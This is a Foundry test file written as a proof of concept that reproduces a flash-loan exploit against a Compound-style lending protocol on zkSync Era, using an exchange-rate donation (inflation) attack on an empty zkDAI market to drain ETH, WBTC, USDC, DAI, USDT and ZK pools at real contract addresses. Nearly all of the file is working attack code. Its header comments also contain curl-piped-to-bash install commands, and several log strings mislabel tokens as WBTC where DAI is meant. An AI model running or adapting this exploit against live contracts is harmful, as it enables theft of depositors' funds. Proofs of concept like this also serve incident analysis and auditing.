// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/src/Test.sol";
import "./interface.sol";
//import "forge-std/src/StdCheats.sol";

// @Analysis
// need to install foundry-zksync
// https://foundry-book.zksync.io/getting-started/installation
// curl -L https://raw.githubusercontent.com/matter-labs/foundry-zksync/main/install-foundry-zksync | bash
// forge test --match-path ./test/zk.sol  -vvv
// 
// 还原为原装foundry
// https://book.getfoundry.sh/getting-started/installation
// curl -L https://foundry.paradigm.xyz | bash


interface IChainlinkPriceOracleProxy {
    function getUnderlyingPrice(address cToken) external view returns (uint);
}


contract contractTest is Test,IERC3156FlashBorrower {
    IERC20 DAI = IERC20(0x4B9eb6c0b6ea15176BBF62841C6B2A8a398cb656);
    IERC20 DAI_implemanet = IERC20(0x1F13810c6fFC29a9a26456f1D8541e4631178eaB);
    IERC20 WBTC = IERC20(0xBBeB516fb02a01611cBBE0453Fe3c580D7281011);
    IERC20 USDC = IERC20(0x3355df6D4c9C3035724Fd0e3914dE96A5a83aaf4);
    IERC20 USDT = IERC20(0x493257fD37EDB34451f62EDf8D2a0C418852bA4C);
    IERC20 ZK = IERC20(0x5A7d6b2F92C77FAD6CCaBd7EE0624E64907Eaf3E);
    IERC20 CHEEMS = IERC20(0x9Db6BF8B0215A02BEA9beF28A92D829FD008D480);
    
    
    crETH CEther = crETH(0x36002f692234cDF2f115Ee701a9899DCB69F19d8);
    ICErc20Delegate zkDAI = ICErc20Delegate(0x0d0DA0914ac765F7AbA5A010b200A0aFA29576c0); //正常zkDAI
    ICErc20Delegate zkDAIAbNormal = ICErc20Delegate(0x4a7c5dd4686E6a82097c856A69281Bb9cb344EBA); //不正常zkDAI
    ICErc20Delegate zkWBTC = ICErc20Delegate(0x86229D72c61cEA84bB51FA5e0F4e24b547C7271C);
    ICErc20Delegate zkUSDC = ICErc20Delegate(0x71b06e77F4c7d5cfbEF7F3b957400Fc0d1a64485);
    ICErc20Delegate zkUSDT = ICErc20Delegate(0x085e2D74aE4e622d9b7C3E9eB45a4e2288885a01);
    ICErc20Delegate zkZK = ICErc20Delegate(0x867c947E6b1fe4243c56786526d059a5B5cfec45);

    IUnitroller unitroller = IUnitroller(0x218EBB63dfDf74eA689fBb2C55964E00ec905332);
    IChainlinkPriceOracleProxy priceOracle = IChainlinkPriceOracleProxy(0xcbf84B2CC8cBB170f6405B924A433f61e2a4d73A);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    SyncSwapVault syncswaovault = SyncSwapVault(0x621425a1Ef6abE91058E9712575dcc4258F8d091);

    function setUp() public {
        // https://zksync.drpc.org
        // https://zksync.meowrpc.com 
        // zkDAIAbNormal was created at block 29842956, was first minted at block 31_182_610
        cheats.createSelectFork("https://mainnet.era.zksync.io", 31_182_610); //31_182_610  47359419
        cheats.label(address(WBTC), "WBTC");
        cheats.label(address(USDC), "USDC");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(DAI), "DAI");
        cheats.label(address(ZK), "ZK");
        cheats.label(address(CHEEMS), "CHEEMS");

        cheats.label(address(CEther), "CEther");
        cheats.label(address(zkWBTC), "zkWBTC");
        cheats.label(address(zkUSDC), "zkUSDC");
        cheats.label(address(zkDAI), "zkDAI");
        cheats.label(address(zkUSDT), "zkUSDT");
        cheats.label(address(zkZK), "zkZK");
        cheats.label(address(syncswaovault), "syncswaovault");
        cheats.label(address(unitroller), "unitroller");
        cheats.label(address(priceOracle), "priceOracle");

    }

    function testExploit() external {
        // payable(address(0)).transfer(address(this).balance);
        emit log_named_uint("ETH Balance after sending to blackHole", address(this).balance);
        // DAI是一个代理 BeaconProxy，直接调用balanceof函数都有问题  deal没法使用呢
        // https://github.com/foundry-rs/forge-std/issues/570   仅仅需要balance，可以解决
        // https://github.com/foundry-rs/forge-std/issues/318  通过prank解决
        //transfer 10 dai to  this address
        deal(address(DAI), address(this), 20e18);
        //deal(address(DAI), address(this), 10 ether);
        //deal(address(CHEEMS), address(this), 10 ether);
        // emit log_named_uint("DAI Balance of Valut", DAI.balanceOf(0x621425a1Ef6abE91058E9712575dcc4258F8d091));

        //vm.startPrank(0x621425a1Ef6abE91058E9712575dcc4258F8d091);
        //DAI_implemanet.transfer(address(this), 10e18); 
        //CHEEMS.transfer(address(this), 10e18);
        //vm.stopPrank();

        //approve
        DAI.approve(address(zkDAIAbNormal), type(uint256).max);
        // mint
        zkDAIAbNormal.mint(10 * 1e8);
        //wait 5 blocks
        // vm.warp(block.timstamp + 30 days);
        // vm.roll(block.number + 5);

        // start 
        syncswaovault.flashLoan(this, address(DAI), 500 * 1e18, new bytes(0));

        emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, 18);
        emit log_named_decimal_uint("Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals());
        emit log_named_decimal_uint("Attacker WBTC balance after exploit", WBTC.balanceOf(address(this)), WBTC.decimals());
        emit log_named_decimal_uint("Attacker ZK balance after exploit", ZK.balanceOf(address(this)), ZK.decimals());
        emit log_named_decimal_uint("Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals());
        emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());

    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    )external returns (bytes32){ 
        zkDAIAbNormal.redeem(zkDAIAbNormal.balanceOf(address(this)));

        console.log("1. ETH Drain \r");
        ETHDrains();
        console.log("2. WBTC Drain \r");
        tokenDrains(zkWBTC);
        console.log("3. USDC Drain \r");
        tokenDrains(zkUSDC);
        console.log("4. DAI Drain \r");
        tokenDrains(zkDAI);
        console.log("5. USDT Drain");
        tokenDrains(zkUSDT);
        console.log("6. ZK Drain");
        tokenDrains(zkZK);

        DAI.approve(address(syncswaovault), type(uint256).max);
        DAI.transfer(address(syncswaovault), amount + fee);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function ETHDrains() internal {
        uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));
        bytes memory creationBytecode = getETHDrainCreationBytecode(address(CEther));
        address DrainAddress = getAddress(creationBytecode, _salt);
        WBTC.transfer(DrainAddress, WBTC.balanceOf(address(this)));

        ETHDrain ETHDrainer = new ETHDrain{salt: bytes32(_salt)}(CEther);
        uint256 liquidationRepayAmount = getLiquidationRepayAmount(address(CEther));
        CEther.liquidateBorrow{value: liquidationRepayAmount}(address(ETHDrainer), address(zkDAIAbNormal));
        zkDAIAbNormal.redeem(1); // Withdraw remaining share from hWBTC
        console.log("*************************************************");
        console.log("\r");
    }

    function tokenDrains(ICErc20Delegate hToken) internal {
        uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));
        bytes memory creationBytecode = gettokenDrainCreationBytecode(address(hToken));
        address DrainAddress = getAddress(creationBytecode, _salt);
        WBTC.transfer(DrainAddress, WBTC.balanceOf(address(this)));

        tokenDrain tokenDrainer = new tokenDrain{salt: bytes32(_salt)}(hToken);
        IERC20 underlyingToken = IERC20(hToken.underlying());
        underlyingToken.approve(address(hToken), type(uint256).max);
        hToken.liquidateBorrow(address(tokenDrainer), getLiquidationRepayAmount(address(hToken)), address(zkDAIAbNormal));
        zkDAIAbNormal.redeem(1); // Withdraw remaining share from hWBTC
        console.log("*************************************************");
        console.log("\r");
    }

    function getLiquidationRepayAmount(address zkToken) public view returns (uint256) {
        uint256 exchangeRate = zkDAIAbNormal.exchangeRateStored();
        uint256 liquidationIncentiveMantissa = 1080000000000000000;
        uint256 priceBorrowedMantissa = priceOracle.getUnderlyingPrice(address(zkToken));
        uint256 priceCollateralMantissa = priceOracle.getUnderlyingPrice(address(zkDAIAbNormal));
        uint256 zkTokenAmount = 1;
        uint256 liquidateAmount = 1e18/(priceBorrowedMantissa * liquidationIncentiveMantissa / (exchangeRate * zkTokenAmount * priceCollateralMantissa / 1e18)) + 1;
        return liquidateAmount;
    }

    function getETHDrainCreationBytecode(address token) public pure returns (bytes memory) {
        bytes memory bytecode = type(ETHDrain).creationCode;
        return abi.encodePacked(bytecode, abi.encode(token));
    }

    function gettokenDrainCreationBytecode(address token) public pure returns (bytes memory) {
        bytes memory bytecode = type(tokenDrain).creationCode;
        return abi.encodePacked(bytecode, abi.encode(token));
    }

    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }

    receive() external payable {}
}

contract ETHDrain is Test {
    IERC20 DAI = IERC20(0x4B9eb6c0b6ea15176BBF62841C6B2A8a398cb656);
    ICErc20Delegate zkDAI = ICErc20Delegate(0x4a7c5dd4686E6a82097c856A69281Bb9cb344EBA);// abnormal dai
    IUnitroller unitroller = IUnitroller(0x218EBB63dfDf74eA689fBb2C55964E00ec905332);
    crETH CEtherDelegate;

    constructor(crETH Delegate) payable {
        console.log("First step, Deposit a small amount of WBTC to the empty zkDAI pool to obtain shares");
        CEtherDelegate = Delegate;
        DAI.approve(address(zkDAI), type(uint256).max);
        zkDAI.mint(4 * 1e8);
        zkDAI.redeem(zkDAI.totalSupply() - 2); // completing the initial deposit, the shares of zkDAI and the amount of WBTC in zkDAI are at a minimum
        console2.log("ETHDrain's share in zkDAI:", zkDAI.balanceOf(address(this)), "the WBTC amount in zkDAI:", DAI.balanceOf(address(zkDAI)));
        console.log("\r");

        console.log("Second step, Donate a large amount of WBTC to the hWBTC pool to increase the exchangeRate(the number of WBTC represented by each share)");
        (,,, uint256 exchangeRate_1) = zkDAI.getAccountSnapshot(address(this));
        console.log("exchangeRate before manipulation:", exchangeRate_1);
        uint256 donationAmount = DAI.balanceOf(address(this));
        DAI.transfer(address(zkDAI), donationAmount); // "donation" exchangeRate manipulation
        uint256 WBTCAmountInhWBTC = DAI.balanceOf(address(zkDAI));
        (,,, uint256 exchangeRate_2) = zkDAI.getAccountSnapshot(address(this));
        console.log("exchangeRate after manipulation:", exchangeRate_2);
        console.log("\r");

        console.log("Third setp, Lend tokens from the hEther pool and send to exploiter");
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(zkDAI);
        unitroller.enterMarkets(cTokens);
        uint256 borrowAmount = CEtherDelegate.getCash() - 1;
        CEtherDelegate.borrow(borrowAmount);
        payable(address(msg.sender)).transfer(address(this).balance);
        console.log("\r");

        console.log("Fouth step, redeem WBTC from the hWBTC pool");
        uint256 redeemAmount = donationAmount - 1;
        console.log("Calculate the amount of shares represented by the redeem amount:", redeemAmount * zkDAI.totalSupply() / WBTCAmountInhWBTC);
        console.log("another way of calculating, redeemAmount * 1e18 / exchangeRate:", redeemAmount * 1e18 / exchangeRate_2);
        console.log("Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:", redeemAmount * zkDAI.totalSupply() / WBTCAmountInhWBTC);
        zkDAI.redeemUnderlying(redeemAmount);
        console2.log("after redeem the ETHDrain's share in hWBTC:", zkDAI.balanceOf(address(this)), "the WBTC amount in hWBTC:", DAI.balanceOf(address(zkDAI)));
        console.log("\r");

        console.log("Firth step, send WBTC to exploiter");
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
        console.log("\r");
    }

    receive() external payable {}
}

contract tokenDrain is Test {
    IERC20 DAI = IERC20(0x4B9eb6c0b6ea15176BBF62841C6B2A8a398cb656);
    ICErc20Delegate zkDAI = ICErc20Delegate(0x4a7c5dd4686E6a82097c856A69281Bb9cb344EBA);// abnormal dai
    IUnitroller unitroller = IUnitroller(0x218EBB63dfDf74eA689fBb2C55964E00ec905332);
    ICErc20Delegate CErc20Delegate;

    constructor(ICErc20Delegate Delegate) payable {
        console.log("First step, Deposit a small amount of DAI to the empty zkDAI pool to obtain shares");
        CErc20Delegate = Delegate;
        DAI.approve(address(zkDAI), type(uint256).max);
        zkDAI.mint(4 * 1e8);//????
        zkDAI.redeem(zkDAI.totalSupply() - 2); // completing the initial deposit, the shares of hWBTC and the amount of WBTC in hWBTC are at a minimum
        console2.log("toeknDrain's share in zkDAI:", zkDAI.balanceOf(address(this)), "the DAI amount in zkDAI:", DAI.balanceOf(address(zkDAI)));
        console.log("\r");

        console.log("Second step, Donate a large amount of DAI to the zkDAI pool to increase the exchangeRate(the number of DAI represented by each share)");
        (,,, uint256 exchangeRate_1) = zkDAI.getAccountSnapshot(address(this));
        console.log("exchangeRate before manipulation:", exchangeRate_1);
        uint256 donationAmount = DAI.balanceOf(address(this));
        DAI.transfer(address(zkDAI), donationAmount); // "donation" exchangeRate manipulation
        uint256 WBTCAmountInhWBTC = DAI.balanceOf(address(zkDAI));
        (,,, uint256 exchangeRate_2) = zkDAI.getAccountSnapshot(address(this));
        console.log("exchangeRate after manipulation:", exchangeRate_2);
        console.log("\r");

        console.log("Third setp, Lend tokens from the zkToken pool and send to exploiter");
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(zkDAI);
        unitroller.enterMarkets(cTokens);
        uint256 borrowAmount = CErc20Delegate.getCash() - 1;
        CErc20Delegate.borrow(borrowAmount);
        IERC20 underlyingToken = IERC20(CErc20Delegate.underlying());
        underlyingToken.transfer(msg.sender, borrowAmount); // borrow token and send to exploiter
        console.log("\r");

        console.log("Fouth step, redeem zkDAI from the zkDAI pool");
        uint256 redeemAmount = donationAmount;
        console.log("Calculate the amount of shares represented by the redeem amount:", redeemAmount * zkDAI.totalSupply() / WBTCAmountInhWBTC);
        console.log("another way of calculating, redeemAmount * 1e18 / exchangeRate:", redeemAmount * 1e18 / exchangeRate_2);
        console.log("Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:", redeemAmount * zkDAI.totalSupply() / WBTCAmountInhWBTC);
        zkDAI.redeemUnderlying(redeemAmount);
        console2.log("after redeem the toeknDrain's share in hWBTC:", zkDAI.balanceOf(address(this)),"the WBTC amount in hWBTC", DAI.balanceOf(address(zkDAI)));
        console.log("\r");

        console.log("Firth step, send WBTC to exploiter");
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
        console.log("\r");
    }
}

